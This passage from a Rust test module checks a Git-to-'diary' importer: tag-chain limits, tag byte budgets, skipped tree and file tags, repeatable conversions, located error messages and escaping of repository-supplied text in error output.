        set_test_cut_sizes(None);
    }

    #[test]
    fn tags_convert() {
        let (dir, git) = repo(Sha1);
        let file = blob(&git, b"a");
        let tree = git.tree(&[(b"100644", b"a", file)]);
        let commit = git.commit(&commit_bytes(&tree, &[], "", b"m\n"));
        let later = git.commit(&commit_bytes(&tree, &[commit], "", b"later\n"));
        let tag = |object: &GitId, kind: &str, name: &str, message: &[u8]| {
            let head = format!(
                "object {}\ntype {kind}\ntag {name}\ntagger T <t@x> 1 +0000\n\n",
                object.to_hex()
            );
            [head.as_bytes(), message].concat()
        };
        let signature =
            b"Release 1\n-----BEGIN PGP SIGNATURE-----\n\niQEz\n-----END PGP SIGNATURE-----\n";
        let signed = tag(&commit, "commit", "v1", signature);
        let signed_id = git.object(ObjectType::Tag, &signed);
        let outer = tag(&signed_id, "tag", "v1-again", b"Again\n");
        let outer_id = git.object(ObjectType::Tag, &outer);
        let of_tree = git.object(ObjectType::Tag, &tag(&tree, "tree", "snapshot", b"x\n"));
        // `chain[k]` reaches the commit through `k` tag objects.
        let mut chain = vec![commit];
        for k in 0..17 {
            let kind = if k == 0 { "commit" } else { "tag" };
            let id = git.object(
                ObjectType::Tag,
                &tag(&chain[k], kind, &format!("t{k}"), b"x\n"),
            );
            chain.push(id);
        }
        let long = "\u{20ac}".repeat(30_000);
        let long_id = git.object(
            ObjectType::Tag,
            &tag(&commit, "commit", "long", long.as_bytes()),
        );
        let latin1 = git.object(ObjectType::Tag, &tag(&commit, "commit", "l", b"caf\xe9\n"));
        let big = git.object(
            ObjectType::Tag,
            &tag(&commit, "commit", "big", &vec![b'b'; 1 << 20]),
        );
        let ((save, done, refused), _) = convert(dir.path(), "a", |c| {
            let save = c.commit(&commit).unwrap();
            let done = [
                ("light", commit),
                ("v1", signed_id),
                ("v1-again", outer_id),
                ("snapshot", of_tree),
                ("a-file", file),
                ("t15", chain[16]),
                ("long", long_id),
                ("l", latin1),
            ]
            .map(|(name, target)| c.tag(name, &target).unwrap());
            let refused = [("t16", chain[17]), ("big", big), ("later", later)]
                .map(|(name, target)| c.tag(name, &target));
            (save, done, refused)
        });
        let made = |message: &str, git_tags: Vec<Vec<u8>>| {
            TagOutcome::Tag(diary::Tag {
                save,
                message: message.into(),
                git_tags,
            })
        };
        let signature = String::from_utf8(signature.to_vec()).unwrap();
        assert_eq!(done[0], made("", vec![]));
        assert_eq!(done[1], made(&signature, vec![signed.clone()]));
        assert_eq!(done[2], made("Again\n", vec![outer, signed]));
        assert!(
            matches!(&done[3], TagOutcome::Skipped { reason } if reason.contains("folder")),
            "{:?}",
            done[3]
        );
        assert!(
            matches!(&done[4], TagOutcome::Skipped { reason } if reason.contains("file")),
            "{:?}",
            done[4]
        );
        let TagOutcome::Tag(sixteen) = &done[5] else {
            panic!("{:?}", done[5])
        };
        assert_eq!(sixteen.git_tags.len(), 16);
        // Cut at a character boundary to 64 KiB.
        let TagOutcome::Tag(cut) = &done[6] else {
            panic!("{:?}", done[6])
        };
        assert_eq!(cut.message, "\u{20ac}".repeat(21_845));
        let TagOutcome::Tag(converted) = &done[7] else {
            panic!("{:?}", done[7])
        };
        assert_eq!(converted.message, "caf\u{fffd}\n");
        let [seventeen, big_r, later_r] = refused;
        assert_refused(seventeen, &["tag `t16`", "16 tag objects"]);
        assert_refused(big_r, &["tag `big`", &big.to_hex(), "1 MiB"]);
        match later_r {
            Err(ImportError::Stop { what, hint }) => {
                assert!(
                    what.contains(&later.to_hex()) && what.contains("report"),
                    "{what}"
                );
                assert!(hint.unwrap().starts_with("Nothing was changed."));
            }
            other => panic!("{other:?}"),
        }
    }

    #[test]
    fn the_tags_bytes_are_budgeted() {
        let (dir, git) = repo(Sha1);
        let tree = git.tree(&[]);
        let commit = git.commit(&commit_bytes(&tree, &[], "", b"m\n"));
        let head = format!("object {}\ntype commit\ntag v1\n", commit.to_hex());
        let raw = format!("{head}tagger T <t@x> 1 +0000\n\nRelease\n").into_bytes();
        let signed = git.object(ObjectType::Tag, &raw);
        let missing = GitId::from_hex(Sha1, &"ee".repeat(20)).unwrap();
        let ((first, again, refused, unread), _) = convert(dir.path(), "a", |c| {
            c.commit(&commit).unwrap();
            let before = c.tags.used;
            let first = c.tag("v1", &signed).unwrap();
            // Room for one more tag of the same chain, not two: each ref keeps its bytes.
            let each = c.tags.used - before;
            c.tags.most = c.tags.used + each + each / 2;
            let again = c.tag("v1-again", &signed).unwrap();
            let refused = c.tag("v1-third", &signed);
            // Once the budget is spent, nothing more is read, not even an object that's missing.
            c.tags.most = c.tags.used;
            (first, again, refused, c.tag("v2", &missing))
        });
        assert_eq!(first, again);
        for (result, name) in [(refused, "v1-third"), (unread, "v2")] {
            match result {
                Err(ImportError::Stop { what, hint }) => {
                    assert!(what.contains(&format!("tag `{name}`")), "{what}");
                    assert!(what.contains("tag list"), "{what}");
                    let hint = hint.unwrap();
                    assert!(hint.starts_with("Nothing was changed."), "{hint}");
                    assert!(hint.contains("git tag -d"), "{hint}");
                }
                other => panic!("{name}: {other:?}"),
            }
        }
    }

    #[test]
    fn tag_objects_are_read_once_when_their_chain_ends_at_a_tree() {
        let (dir, git) = repo(Sha1);
        let tag = |object: &GitId, kind: &str, name: &str| {
            let raw = format!(
                "object {}\ntype {kind}\ntag {name}\ntagger T <t@x> 1 +0000\n\nx\n",
                object.to_hex()
            );
            git.object(ObjectType::Tag, raw.as_bytes())
        };
        // A chain of 15 tag objects ending at a folder, under many tags of their own.
        let mut shared = vec![tag(&git.tree(&[]), "tree", "s0")];
        for k in 1..15 {
            shared.push(tag(&shared[k - 1], "tag", &format!("s{k}")));
        }
        let top = shared[14];
        let outer: Vec<GitId> = (0..50)
            .map(|i| tag(&top, "tag", &format!("o{i}")))
            .collect();
        // Two more on top: 17 tag objects in all.
        let longer = tag(&tag(&top, "tag", "p"), "tag", "q");
        // One more on `o1`, whose length is learned from what the shared chain left behind.
        let above = tag(&outer[1], "tag", "above");
        let loose = |id: &GitId| {
            let hex = id.to_hex();
            dir.path()
                .join(".git/objects")
                .join(&hex[..2])
                .join(&hex[2..])
        };
        let ((outcomes, too_long), _) = convert(dir.path(), "a", |c| {
            let mut outcomes = vec![c.tag("o0", &outer[0]).unwrap()];
            // Read once, the shared chain is never read again: its objects can go.
            for id in &shared {
                fs::remove_file(loose(id)).unwrap();
            }
            for (i, id) in outer.iter().enumerate().skip(1) {
                outcomes.push(c.tag(&format!("o{i}"), id).unwrap());
            }
            (
                outcomes,
                [("q", longer), ("above", above)].map(|(n, t)| c.tag(n, &t)),
            )
        });
        for outcome in &outcomes {
            assert!(
                matches!(outcome, TagOutcome::Skipped { reason } if reason.contains("folder")),
                "{outcome:?}"
            );
        }
        // The length counts the objects remembered too, and stops before reading them.
        let [q, above] = too_long;
        assert_refused(q, &["tag `q`", "16 tag objects"]);
        assert_refused(above, &["tag `above`", "16 tag objects"]);
    }

    #[test]
    fn a_tree_or_blob_tagged_many_times_is_looked_at_once() {
        let (dir, git) = repo(Sha1);
        let tree = git.tree(&[]);
        let file = blob(&git, b"x");
        let tag = |object: &GitId, kind: &str, name: &str| {
            let raw = format!(
                "object {}\ntype {kind}\ntag {name}\ntagger T <t@x> 1 +0000\n\nx\n",
                object.to_hex()
            );
            git.object(ObjectType::Tag, raw.as_bytes())
        };
        // A tag object of the file, under two tags of their own.
        let inner = tag(&file, "blob", "inner");
        let [first, second] = ["a", "b"].map(|name| tag(&inner, "tag", name));
        let loose = |id: &GitId| {
            let hex = id.to_hex();
            dir.path()
                .join(".git/objects")
                .join(&hex[..2])
                .join(&hex[2..])
        };
        let (outcomes, _) = convert(dir.path(), "a", |c| {
            let mut outcomes = vec![
                ("folder", c.tag("t0", &tree).unwrap()),
                ("file", c.tag("f0", &file).unwrap()),
                ("file", c.tag("a", &first).unwrap()),
            ];
            // Met once, none of them is looked at again: their objects can go.
            for id in [tree, file, inner] {
                fs::remove_file(loose(&id)).unwrap();
            }
            for i in 1..50 {
                outcomes.push(("folder", c.tag(&format!("t{i}"), &tree).unwrap()));
                outcomes.push(("file", c.tag(&format!("f{i}"), &file).unwrap()));
            }
            outcomes.push(("file", c.tag("b", &second).unwrap()));
            outcomes
        });
        assert_eq!(outcomes.len(), 102);
        for (what, outcome) in &outcomes {
            assert!(
                matches!(outcome, TagOutcome::Skipped { reason } if reason.contains(what)),
                "{what}: {outcome:?}"
            );
        }
    }

    #[test]
    fn converting_twice_gives_identical_saves() {
        for hash in [Sha1, Sha256] {
            let (dir, git) = repo(hash);
            let text = blob(&git, b"text\n");
            let submodule = GitId::from_hex(hash, &"cd".repeat(hash.len())).unwrap();
            let bin = git.tree(&[(b"100755", b"run", text)]);
            let tree = git.tree(&[
                (b"40000", b"bin", bin),
                (b"100644", b"file", text),
                (b"120000", b"link", blob(&git, b"file")),
                (b"160000", b"sub", submodule),
            ]);
            let root = git.commit(&commit_bytes(&tree, &[], "", b"root\n"));
            let side = git.commit(&commit_bytes(&tree, &[root], GPGSIG, b"side\n"));
            let main = git.commit(&commit_bytes(
                &tree,
                &[root],
                "encoding latin1\n",
                b"\xe9\n",
            ));
            let merge = git.commit(&commit_bytes(&bin, &[main, side], "", b"Merge\n"));
            let run = |c: &mut Converter<'_>| {
                let r = c.commit(&root).unwrap();
                let s = c.commit(&side).unwrap();
                let m = c.commit(&main).unwrap();
                [r, s, m, c.commit(&merge).unwrap()]
            };
            let (first, _) = convert(dir.path(), "a", run);
            let (second, _) = convert(dir.path(), "b", run);
            assert_eq!(first, second, "{hash:?}");
        }
    }

    #[test]
    fn errors_say_where_they_were_met() {
        let (dir, git) = repo(Sha1);
        let file = blob(&git, b"x");
        let missing = GitId::from_hex(Sha1, &"12".repeat(20)).unwrap();
        let src = git.tree(&[(b"100644", b"gone.txt", missing)]);
        let lost = commit_of(&git, &[(b"40000", b"src", src)]);
        let unordered = git.tree(&[(b"100644", b"b", file), (b"100644", b"a", file)]);
        let jumbled = commit_of(&git, &[(b"40000", b"lib", unordered)]);
        let tree_is_a_file = git.commit(&commit_bytes(&file, &[], "", b"m\n"));
        let folder_is_a_file = commit_of(&git, &[(b"40000", b"docs", file)]);
        let a_tree = git.tree(&[]);
        let (results, _) = convert(dir.path(), "a", |c| {
            [lost, jumbled, tree_is_a_file, folder_is_a_file, a_tree].map(|id| c.commit(&id))
        });
        let [lost_r, jumbled_r, tree_r, folder_r, a_tree_r] = results;
        let in_file = format!("the file `src/gone.txt` of commit `{}`", lost.to_hex());
        assert_refused(lost_r, &["missing object", &missing.to_hex(), &in_file]);
        let in_folder = format!(
            "the folder `lib` (tree `{}`) of commit `{}`",
            unordered.to_hex(),
            jumbled.to_hex()
        );
        assert_refused(jumbled_r, &["out of Git's order", &in_folder]);
        assert_refused(
            tree_r,
            &[
                "is a blob, not a tree",
                "the top folder",
                &tree_is_a_file.to_hex(),
            ],
        );
        assert_refused(
            folder_r,
            &[
                "is a blob, not a tree",
                "`docs`",
                &folder_is_a_file.to_hex(),
            ],
        );
        assert_refused(a_tree_r, &["is a tree, not a commit", &a_tree.to_hex()]);
    }

    #[test]
    fn messages_show_repository_text_escaped() {
        for e in [
            ImportError::Stop {
                what: HOSTILE.into(),
                hint: None,
            },
            ImportError::NotUtf8Names {
                first: vec![(HOSTILE.into(), HOSTILE.into())],
                count: 1,
            },
            ImportError::LfsMissing {
                first: vec![(HOSTILE.into(), HOSTILE.into(), 1)],
                count: 2,
                bytes: 2,
                config_includes: true,
            },
            ImportError::LfsMismatch {
                commit: HOSTILE.into(),
                path: HOSTILE.into(),
                oid: HOSTILE.into(),
            },
            ImportError::LfsExtension {
                commit: HOSTILE.into(),
                path: HOSTILE.into(),
            },
            ImportError::LfsElsewhere {
                kept: LfsElsewhere::Storage {
                    value: HOSTILE.into(),
                    file: HOSTILE.into(),
                },
                commit: HOSTILE.into(),
                path: HOSTILE.into(),
            },
            ImportError::LfsElsewhere {
                kept: LfsElsewhere::Linked {
                    folder: HOSTILE.into(),
                },
                commit: HOSTILE.into(),
                path: HOSTILE.into(),
            },
        ] {
            assert_hostile_text_escaped(&e.to_string());
        }
        // Hints that name the commit or the folder escape them too.
        for e in [
            ImportError::LfsMismatch {
                commit: HOSTILE.into(),
                path: String::new(),
                oid: String::new(),
            },
            ImportError::LfsElsewhere {
                kept: LfsElsewhere::Linked {
                    folder: HOSTILE.into(),
                },
                commit: String::new(),
                path: String::new(),
            },
        ] {
            assert_hostile_text_escaped(&e.hint().unwrap());
        }
        // A name too long, from a real tree.
        let (dir, git) = repo(Sha1);
        let name = format!("{HOSTILE}{}", "x".repeat(800));
        let id = commit_of(&git, &[(b"100644", name.as_bytes(), blob(&git, b"x"))]);
        let (result, _) = convert(dir.path(), "a", |c| c.commit(&id));
        assert_hostile_text_escaped(&result.unwrap_err().to_string());
    }
}
